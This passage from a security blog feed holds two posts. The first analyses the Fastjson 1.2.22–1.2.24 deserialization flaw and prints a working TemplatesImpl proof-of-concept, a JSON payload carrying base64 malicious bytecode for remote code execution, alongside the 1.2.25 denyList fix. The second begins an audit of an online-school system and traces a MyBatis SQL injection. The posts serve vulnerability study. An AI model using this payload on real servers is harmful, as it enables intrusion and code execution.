class="type">name</span>\":\"thisisname\", \"age\":\"thisisage\"&#125;");</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println(obj2);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">Object</span> obj3 = <span class="type">JSON</span>.parseObject("&#123;\"@<span class="keyword">type</span>\":\"com.fastjson.FastJsonTest\",\"<span class="type">name</span>\":\"thisisname\", \"age\":\"thisisage\"&#125;",FastJsonTest.<span class="keyword">class</span>);</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println(obj3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行，得到的结果如图:</p><p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228215030.png" alt></p><p>通过上面的结果。我们可以知道:</p><ul><li><p>使用JSON.parse(jsonstr)和JSON.parseObject(jsonstr, FastJsonTest.class)两种方式返回的结果相同:<strong>构造方法+Json字符串指定属性的setter()+特殊的getter()</strong></p></li><li><p>JSON.parseObject(jsonstr)会调用目标类中所有的getter方法，包括不存在属性和私有属性的getter()。<strong>原因是在调用JSON.parseObject(jsonstr)时会多执行JSON.toJSON()方法,JSON.toJSON()会将目标类中所有getter方法记录下来。</strong></p></li></ul><p>什么样getter可以被调用呢?</p><p>在JavaBeanInfo类中可以找到：</p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ截图20210301202051.png"><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (methodName.length<span class="literal">()</span> &gt;= <span class="number">4</span><span class="operator"> &amp;&amp; </span>!<span class="module-access"><span class="module"><span class="identifier">Modifier</span>.</span></span>is<span class="constructor">Static(<span class="params">method</span>.<span class="params">getModifiers</span>()</span>)<span class="operator"> &amp;&amp; </span>methodName.starts<span class="constructor">With(<span class="string">"get"</span>)</span><span class="operator"> &amp;&amp; </span><span class="module-access"><span class="module"><span class="identifier">Character</span>.</span></span>is<span class="constructor">UpperCase(<span class="params">methodName</span>.<span class="params">charAt</span>(3)</span>)<span class="operator"> &amp;&amp; </span><span class="keyword">method</span>.get<span class="constructor">ParameterTypes()</span>.length<span class="operator"> == </span><span class="number">0</span><span class="operator"> &amp;&amp; </span>(<span class="module-access"><span class="module"><span class="identifier">Collection</span>.</span></span><span class="keyword">class</span>.is<span class="constructor">AssignableFrom(<span class="params">method</span>.<span class="params">getReturnType</span>()</span>)<span class="operator"> || </span><span class="module-access"><span class="module"><span class="identifier">Map</span>.</span></span><span class="keyword">class</span>.is<span class="constructor">AssignableFrom(<span class="params">method</span>.<span class="params">getReturnType</span>()</span>)<span class="operator"> || </span><span class="module-access"><span class="module"><span class="identifier">AtomicBoolean</span>.</span></span><span class="keyword">class</span><span class="operator"> == </span><span class="keyword">method</span>.get<span class="constructor">ReturnType()</span><span class="operator"> || </span><span class="module-access"><span class="module"><span class="identifier">AtomicInteger</span>.</span></span><span class="keyword">class</span><span class="operator"> == </span><span class="keyword">method</span>.get<span class="constructor">ReturnType()</span><span class="operator"> || </span><span class="module-access"><span class="module"><span class="identifier">AtomicLong</span>.</span></span><span class="keyword">class</span><span class="operator"> == </span><span class="keyword">method</span>.get<span class="constructor">ReturnType()</span>)) &#123;</span><br></pre></td></tr></table></figure><p>总结下来有以下六个条件:</p><ul><li>方法名需要长于4</li><li>不是静态方法</li><li>以get字符串开头，且第四个字符需要是大写字母</li><li>方法不能有参数传入</li><li>继承自Collection || Map || AtomicBoolean || AtomicInteger ||AtomicLong</li><li>此getter不能有setter方法</li></ul><h4 id="Type-关键"><a href="#Type-关键" class="headerlink" title="@Type(关键)"></a>@Type(关键)</h4><p>fastjson通过@Type可以指定反序列化任意类,之后会自动调用类中属性特定的set和get方法。造成反序列化漏洞正是由于fastjson的这个特性。</p><p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228210948.png" alt></p><p>我们这里通过@type指定类，成功获取到了对应的数据。</p><p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228211209.png" alt></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>​    上面我们通过对fastjson反序列化三种方式的学习可以知道。@type关键词会加载任意类，如果字段有setter、getter方法会自动调用该方法，进行赋值，恢复出整个类。也就是说，当我们找到一个类中的getter方法满足调用的条件,并且存在可利用点，就构成了一条攻击链。</p><h3 id="TemplatesImpl利用链-lt-1-2-24"><a href="#TemplatesImpl利用链-lt-1-2-24" class="headerlink" title="TemplatesImpl利用链(&lt;=1.2.24)"></a>TemplatesImpl利用链(&lt;=1.2.24)</h3><h4 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h4><h5 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h5><p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类中getOutputProperties()方法</p><h5 id="限制条件"><a href="#限制条件" class="headerlink" title="限制条件"></a>限制条件</h5><ul><li>服务端使用parseObject时,必须是<code>JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);</code></li><li>服务端使用parse()时,需要<code>JSON.parse(text1,Feature.SupportNonPublicField);</code></li></ul><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p><strong>我们首先找到这条链子最终的漏洞利用点，然后进行逆向回溯找到漏洞点，之后在通过动态调试正向跟一下解析过程</strong></p><p>首先找到TemplatesImpl.getTransletInstance方法:</p><p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228220743.png" alt></p><p>可以看到红框中的使用了newInstance( )方法进行了实例化操作，然后找到获取_class与_transletIndex值的defineTransletClasses()方法，跟进方法内:</p><p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228221015.png" alt></p><p>找到<code>_bytecodes</code>变量,可以看到这个变量是TemplatesImpl类的成员变量，跟进类内部看一下:</p><p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210301203755.png" alt></p><p><code>_bytecodes</code>变量可以在构造json字符串时传入，在构造poc时属于可控变量</p><p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210301204117.png" alt></p><p>​    这里我们继续向下执行的时候需要首先满足这里的_tfactory变量不为null，因为_tfactory为私有变量，且无setter方法，<strong>这里需要指定Feature.SupportNonPublicField参数来为_tfactory赋值。(POC中设置_tfactory为{})</strong></p><p>在第413行,通过for循环取出值，然后交给了loader.defineClass进行处理：</p><p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210301204609.png" alt></p><p>loader.defineClass主要是将传入的字节码转化成class对象，然后又赋给了_class[i]。</p><p><strong>当我们传入比如:_bytecodes:[恶意类]这样的json字符串。程序会将恶意类化为Class对象后赋值给_class[0]。</strong></p><p>之后程序回到getTransletInstance中</p><p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210301221043.png" alt></p><p>这时，这里的<strong>_class[_transletIndex]就是我们传入的恶意类</strong>,然后调用恶意类的newInstance()方法来实例化对象,最后造成命令执行。</p><p>我们现在已经找到了存在漏洞的方法，现在只需要找到一条调用链即可。</p><p><strong>找到com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java</strong></p><p>这里调用了存在漏洞的newTransformer() 方法:</p><p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210301214640.png" alt></p><p>向上追踪newTransformer(),发现TemplatesImpl.java中getOutputProperties()方法中调用了newTransformer()</p><p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210301215120.png" alt></p><p>​    getOutputProperties()方法为<code>_outputProperties</code>成员变量的getter方法。(这里会通过smartMatch() 方法将下划线置空)</p><p>​        TemplatesImpl类_outputProperties成员变量的getter方法满足被调用条件。getOutputProperties()返回类型为Properties，而Properties extends Hashtable，而Hashtable implements Map。无论通过fastjson哪种方式解析json字符串，都可以触发getOutputProperties()方法。</p><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>​    Fastjson通过_bytecodes字段传入恶意类，调用outPutProperties属性的getter方法时,实例化传入的恶意类，调用其构造方法，造成任意命令执行。</p><h4 id="利用POC"><a href="#利用POC" class="headerlink" title="利用POC"></a>利用POC</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">package 版本<span class="number">24</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.<span class="keyword">parser</span>.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.<span class="keyword">parser</span>.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by web on 2017/4/29.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="built_in">public</span> <span class="keyword">class</span> jdk7u21 &#123;</span><br><span class="line">    <span class="built_in">public</span> static String readClass(String cls)&#123;</span><br><span class="line">        ByteArrayOutputStream bos = <span class="built_in">new</span> ByteArrayOutputStream();</span><br><span class="line">        try &#123;</span><br><span class="line">            IOUtils.<span class="keyword">copy</span>(<span class="built_in">new</span> FileInputStream(<span class="built_in">new</span> File(cls)), bos);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        byte[] try1 = bos.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> Base64.encodeBase64String(bos.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">public</span> static <span class="type">void</span>  test_autoTypeDeny() throws <span class="keyword">Exception</span> &#123;</span><br><span class="line">        ParserConfig config = <span class="built_in">new</span> ParserConfig();</span><br><span class="line">        final String fileSeparator = <span class="keyword">System</span>.getProperty("file.separator");</span><br><span class="line">        final String evilClassPath = <span class="keyword">System</span>.getProperty("user.dir") + "\\fastjsonmaven\\target\\classes\\版本24\\EvilObject.class";</span><br><span class="line">        String evilCode = readClass(evilClassPath);</span><br><span class="line">        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";</span><br><span class="line">        String text1 = "&#123;\"@<span class="keyword">type</span>\":\"" + NASTY_CLASS +</span><br><span class="line">                "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;," +</span><br><span class="line">                "\"_name\":\"a\",\"_version\":\"<span class="number">1.0</span>\",\"allowedProtocols\":\"<span class="keyword">all</span>\"&#125;\n";</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println(text1);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">Object</span> obj = <span class="type">JSON</span>.parseObject(text1, <span class="keyword">Object</span>.<span class="keyword">class</span>, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">public</span> static <span class="type">void</span> main(String args[])&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            test_autoTypeDeny();</span><br><span class="line">        &#125; catch (<span class="keyword">Exception</span> e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>@Type：</strong>指定解析类,根据指定类反序列化得到该类的实例,在poc中，<code>_bytecodes</code>与<code>_name</code>都是私有属性，所以要想反序列化这两个，需要在<code>parseObject()</code>时设置<code>Feature.SupportNonPublicField</code></li><li><strong>_bytecodes</strong>:恶意类class文件二进制格式base64编码得到的字符串</li><li><strong>_outputProperties</strong>:调用参数的getOutputProperties方法,造成RCE。</li><li><strong>_tfactory:{}</strong>：在defineTransletClasses()时会调用getExternalExtensionsMap(),当为null时会报错，所以要对_tfactory 设值。</li></ul><h4 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h4><p>​    现在我们已经知道了触发的漏洞点以及POC现在我们正向调试跟踪一下实际调用链，主要看fastjson如何处理我们传入的payload。</p><p>首先在JSON.parseObject这个函数这里下个断点。</p><p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228225705.png" alt></p><p>之后调试跟进，进入com.alibaba.fastjson.parser.DefaultJSONParser类，调用了deriallizer.deserialze来解析传入的数据。</p><p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228233331.png" alt></p><p>在这里的deserialze是一个接口,跟进对应的序列化类<strong>com.alibaba.fastjson.parser.deserializer.JavaObjectDeserializer</strong>中。</p><p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210301224110.png" alt></p><p>这里的代码又重新调用了<strong>DefaultJSONParser</strong>类中的<strong>parseObject</strong>方法。在这里我们的token值为12,根据if判断进入到<strong>skipWhitespace</strong> 中:</p><p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228230054.png" alt></p><p><strong>lexer.skipWhitespace</strong>会对传入的text(也就是我们构造好的payload进行处理)</p><p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228231750.png" alt></p><p>这里我们得到的结果是<strong>“</strong>,根据if判断跟进lexer.scanSymbol方法:</p><p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228232518.png" alt></p><p><strong>scanSymbol</strong>会根据选择的特殊符号进入到相应的位置进行处理。也就是我们最开始时候key的结果是<code>@type</code>，而继续往下自然进入到了这里。</p><p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228232250.png" alt></p><p>由于 <strong>deserialze</strong> 是一个接口，序列化方法类是<strong>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze</strong> ，传入的clazz是我们想要实例化的利用类。</p><p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE202102282333311111.png" alt></p><p>接着跟进<strong>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze</strong>。这里的token是16，text正是我们传入的值。<img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228233425.png" alt></p><p>继续往下走程序会调用<strong>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseField</strong>方法，</p><p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228234359.png" alt></p><p>跟进方法，首先会调用smartMatch方法来处理我们传入的key值，而这里的key值就是我们json中的那些字段，比如：<code>_outputProperties</code>、<code>_name</code>、<code>_bytecodes</code>等。</p><p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228233930.png" alt></p><p>在<strong>com.alibaba.fastjson.serializer.ObjectArrayCodec#parseArray</strong>中，所以这里又会调用 <strong>com.alibaba.fastjson.serializer.ObjectArrayCodec#deserialze</strong> 。</p><p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228235300.png" alt></p><p>这里会先进入decodeBase64方法进行一次base64解码，<strong>这就是为什么poc中需要base64编码</strong></p><p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228235348.png" alt></p><p>在com.alibaba.fastjson.parser.deserializer.DefaultFieldDeserializer 中。最后会通过setValue方式将value赋值给我们要执行的特殊类</p><p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210228235522.png" alt></p><p>在setValue中会调用getOutputProperties()。然后通过method.invoke反射的方式实例化我们的要调用的类。</p><p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210301225104.png" alt></p><p><img src="/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/QQ%E6%88%AA%E5%9B%BE20210301225132.png" alt></p><h3 id="后续修复分析"><a href="#后续修复分析" class="headerlink" title="后续修复分析"></a>后续修复分析</h3><p>​    1.2.25官方对漏洞进行了修复，对更新的源码进行比较，主要的更新在checkAutoType函数,</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">Class</span>&lt;?&gt; checkAutoType(<span class="built_in">String</span> <span class="built_in">typeName</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">typeName</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">             return <span class="literal">null</span>;</span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">         final <span class="built_in">String</span> className = <span class="built_in">typeName</span>.<span class="built_in">replace</span>(<span class="comment">'$', '.');</span></span><br><span class="line"> </span><br><span class="line">         <span class="keyword">if</span> (autoTypeSupport) &#123;</span><br><span class="line">             <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">                 <span class="built_in">String</span> deny = denyList[i];</span><br><span class="line">                 <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                     throw <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + <span class="built_in">typeName</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure><p>​    这里遍历denyList数组，只要引用的库中是以我们的黑名单中的字符串开头的就直接抛出异常中断运行。</p><p>denyList数组，主要利用黑名单机制把常用的反序列化利用库都添加到黑名单中，主要有：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">bsh</span></span><br><span class="line"><span class="selector-tag">com</span><span class="selector-class">.mchange</span></span><br><span class="line"><span class="selector-tag">com</span><span class="selector-class">.sun</span>.</span><br><span class="line"><span class="selector-tag">java</span><span class="selector-class">.lang</span><span class="selector-class">.Thread</span></span><br><span class="line"><span class="selector-tag">java</span><span class="selector-class">.net</span><span class="selector-class">.Socket</span></span><br><span class="line"><span class="selector-tag">java</span><span class="selector-class">.rmi</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.bcel</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.beanutils</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.Transformer</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.functors</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections4</span><span class="selector-class">.comparators</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.fileupload</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.myfaces</span><span class="selector-class">.context</span><span class="selector-class">.servlet</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.tomcat</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.wicket</span><span class="selector-class">.util</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.codehaus</span><span class="selector-class">.groovy</span><span class="selector-class">.runtime</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.hibernate</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.jboss</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.mozilla</span><span class="selector-class">.javascript</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.python</span><span class="selector-class">.core</span>,<span class="selector-tag">org</span><span class="selector-class">.springframework</span></span><br></pre></td></tr></table></figure><p>后续的绕过接下来再分析。。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;​    Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object之间互相转换
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>SSM框架审计学习-- 因酷网校在线教育系统审计</title>
    <link href="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/"/>
    <id>https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/</id>
    <published>2021-02-16T03:34:40.000Z</published>
    <updated>2021-08-20T04:51:38.440Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>     因酷开源网校系统是由北京因酷时代科技有限公司以下简称（因酷教育软件）研发并推出的国内首家Java版开源网校源代码建站系统，并免费提供给非商业用途用户使用，是用户体验最好、运营功能最全、性价比最高的在线教育软件。</p><p>第一次上手一个SSM框架的审计，主要学习一下审计的思路。主要参考自先知社区这篇文章：<a href="https://xz.aliyun.com/t/2646" target="_blank" rel="noopener">JAVA代码审计 | 因酷网校在线教育系统 - 先知社区 (aliyun.com)</a></p><h5 id="java分层思想"><a href="#java分层思想" class="headerlink" title="java分层思想"></a>java分层思想</h5><p>常见的JavaWeb项目分层：</p><blockquote><p>视图层（View 视图)</p><p>控制层（Controller、Action 控制层）</p><p>服务层（Service）</p><p>业务逻辑层BO(business object) </p><p>实体层（entity 实体对象、VO(value object) 值对象 、模型层（bean</p><p>持久层（dao- Data Access Object 数据访问层、PO(persistant object) 持久对象）</p></blockquote><h5 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h5><p>审计一套系统，可以先看看pom.xml中加载了那些组件 ，如果这些组件中本身存在漏洞，就可以直接利用这些漏洞。</p><p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210212114439.png" alt></p><h5 id="web-xml"><a href="#web-xml" class="headerlink" title="web.xml"></a>web.xml</h5><p>​      程序启动时tomcat会首先加载web.xml中的配置 。通过web.xml完成DispathcheServlet的声明，并将我们的请求转发到springmvc中。我们可以首先查看web.xml中是否配置了全局过滤器。判断是否能够bypass。</p><p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213172113.png" alt></p><h5 id="applicationContext-xml"><a href="#applicationContext-xml" class="headerlink" title="applicationContext.xml"></a>applicationContext.xml</h5><p>applicationContext.xml是spring核心配置文件,这里会加载一些其他的配置文件。</p><p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213172023.png" alt></p><h5 id="spring-mvc-xml"><a href="#spring-mvc-xml" class="headerlink" title="spring-mvc.xml"></a>spring-mvc.xml</h5><p>sping-mvc.xml文件中主要的工作是：启动注解、扫描controller包注解；静态资源映射；视图解析（defaultViewResolver）；文件上传（multipartResolver）;返回消息json配置。</p><p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210212111938.png" alt></p><h4 id="后台Sql注入漏洞"><a href="#后台Sql注入漏洞" class="headerlink" title="后台Sql注入漏洞"></a>后台Sql注入漏洞</h4><h5 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h5><p>我们已经知道了系统采用mybatis，mybatis最常见的注入就是使用${}，直接就来找<code>$</code>符号，看看哪些是直接调用了<code>$</code>来进行取值并且没经过过滤的。</p><p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213173933.png" alt></p><p>找到了一处，我们逆向追踪调用逻辑，寻找是否含有过滤并且参数我们是否可控。</p><p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213174226.png" alt></p><p>可以看到接口的实现类里并没有对传入的ids参数进行过滤。继续追踪。</p><p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213174750.png" alt></p><p>跟踪到deleteArticle函数。全局搜索。</p><p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213174304.png" 